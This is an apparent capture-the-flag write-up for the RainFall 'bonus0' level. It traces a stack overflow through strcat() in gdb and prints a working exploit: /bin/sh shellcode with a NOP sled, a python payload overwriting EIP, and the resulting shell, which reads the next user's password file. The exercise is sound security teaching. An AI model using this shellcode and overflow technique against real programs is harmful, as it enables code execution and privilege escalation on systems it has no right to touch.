The binary takes the user input twice and then displays it.
A segfault occurs when to much memory is provided.

bonus0@RainFall:~$ ./bonus0
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��� AAAAAAAAAAAAAAAAAAAA���
Segmentation fault (core dumped)

Let's check which input is causing this.

Breakpoint 1, 0x080485a7 in main ()
(gdb) c
Continuing.
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
eax            0x0      0
ecx            0xffffffff       -1
edx            0xb7fd28b8       -1208145736
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff720       0xbffff720
ebp            0x42424242       0x42424242
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x210286 [ PF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

We understand that the second input is the one over writing the stack.

The functions are called in the following order :
main() calls pp() once which calls p() twice.

p() :

1) calls read() to stock 4096 bytes of user input in a buffer.
2) calls strchr() to find a newline character in previous buffer to be replaced by a nul-byte.
3) copies 20 bytes of the buffer into a string.

pp() :
1) calls p() twice and stores the result in 2 different strings.
2) calls strcpy() to copy the first user input in a 64 bytes string.
3) adds a newspace character at the end of the 64 bytes string.
4) calls strcat() to copy the second user input in the 64 bytes string.

Example :

final output = "" (empty at first)
msg1 = "aaaa" (user input 1)
msg2 = "bbbb" (user input 2)
strcpy(final_output, msg1)
final_output += " "
strcat(final_output, msg2)
final_output = "aaaa bbbb"

(gdb) disas p
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
=> 0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
(gdb) i r   
    edx            0x1000   4096

The 4096 byte buffer user for read().

(gdb) disas p
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
=> 0x080484fc <+72>:    movb   $0x0,(%eax)
call to strchr() and nul-byte set.
(gdb) i r
eax            0xbfffe663       -1073748381
(gdb) x/s 0xbfffe663
0xbfffe663:      "\n"
new line search in strchr.

(gdb) disas pp
0x08048598 <+122>:   call   0x8048390 <strcat@plt>
copy second user input to final output string.

The goal is then to overflow via the call to strcat().

Let's use the same shellcode as in previous exercises.
export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`

The payload will then contain :

1) "A" * 4095 + "\n" -> fill first buffer and use '\n' to indicate second buffer.
2) "A" * 9 -> offset to access next eip's call.
3) "\x6c\xf8\xff\xbf" + "C" * 30' -> Nop sled's address followed by shellcode and fill the rest of the buffer.

python -c 'print "A" * 4095 + "\n" + "A" * 9 + "\x6c\xf8\xff\xbf" + "C" * 30' > /tmp/payload

cat /tmp/payload - | ./bonus0
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9